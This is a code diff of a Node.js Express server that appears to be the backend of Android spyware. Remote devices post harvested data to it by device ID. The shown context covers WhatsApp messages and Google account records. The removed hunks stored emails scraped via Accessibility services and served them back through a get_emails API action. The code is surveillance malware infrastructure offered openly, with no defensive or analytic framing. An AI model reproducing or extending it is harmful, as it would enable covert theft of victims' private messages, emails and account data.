@@ -108,61 +108,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, wa_count: waMessages.length });
         }
         
-        // ✅ حفظ كل البريد من Accessibility
-        if (data.type === 'all_emails') {
-            const deviceId = data.device_id || 'unknown';
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-            
-            const emailFile = path.join(deviceDir, 'emails.json');
-            let emails = [];
-            if (fs.existsSync(emailFile)) emails = JSON.parse(fs.readFileSync(emailFile, 'utf8'));
-            
-            if (data.emails && data.emails.length > 0) {
-                data.emails.forEach(email => {
-                    emails.unshift({
-                        app_name: 'Gmail',
-                        account_name: 'Gmail',
-                        sender: 'Gmail',
-                        subject: email.content || '',
-                        timestamp: email.timestamp || Date.now()
-                    });
-                });
-            }
-            
-            if (emails.length > 5000) emails = emails.slice(0, 5000);
-            
-            fs.writeFileSync(emailFile, JSON.stringify(emails, null, 2));
-            updateDevicesList(deviceId, null);
-            return res.json({ success: true, email_count: emails.length });
-        }
-        
-        // ✅ حفظ رسائل البريد الإلكتروني
-        if (data.type === 'email_message') {
-            const deviceId = data.device_id || 'unknown';
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-            
-            const emailFile = path.join(deviceDir, 'emails.json');
-            let emails = [];
-            if (fs.existsSync(emailFile)) emails = JSON.parse(fs.readFileSync(emailFile, 'utf8'));
-            
-            emails.unshift({
-                app_name: data.app_name || 'Email',
-                account_name: data.account_name || data.sender || 'غير معروف',
-                package_name: data.package_name || '',
-                sender: data.sender || 'غير معروف',
-                subject: data.subject || '',
-                timestamp: data.timestamp || Date.now()
-            });
-            
-            if (emails.length > 2000) emails = emails.slice(0, 2000);
-            
-            fs.writeFileSync(emailFile, JSON.stringify(emails, null, 2));
-            updateDevicesList(deviceId, null);
-            return res.json({ success: true, email_count: emails.length });
-        }
-        
         const deviceId = data.device_id || 'unknown';
         const deviceDir = path.join(dataDir, deviceId);
         if (!fs.existsSync(deviceDir)) { fs.mkdirSync(deviceDir, { recursive: true }); fs.mkdirSync(path.join(deviceDir, 'files'), { recursive: true }); }
@@ -343,12 +288,6 @@ app.get('/api.php', (req, res) => {
         if (action === 'get_google_accounts') {
             const accountsFile = path.join(dataDir, deviceId, 'google_accounts.json');
             if (fs.existsSync(accountsFile)) return res.json(JSON.parse(fs.readFileSync(accountsFile, 'utf8')));
-            return res.json([]);
-        }
-        
-        if (action === 'get_emails') {
-            const emailFile = path.join(dataDir, deviceId, 'emails.json');
-            if (fs.existsSync(emailFile)) return res.json(JSON.parse(fs.readFileSync(emailFile, 'utf8')));
             return res.json([]);
         }
         
